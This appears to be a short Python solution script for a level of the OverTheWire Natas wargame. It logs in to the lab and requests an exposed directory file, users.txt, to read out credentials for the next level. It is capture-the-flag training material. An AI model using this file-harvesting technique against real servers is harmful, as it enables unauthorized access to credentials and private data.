import requests
import time

url = "http://natas2.natas.labs.overthewire.org/"
auth = ("natas2", "secret")

response = requests.get(url=url + "files/users.txt", auth=auth)

print("[+]Here is your password:")
time.sleep(1.5)
print(response.text)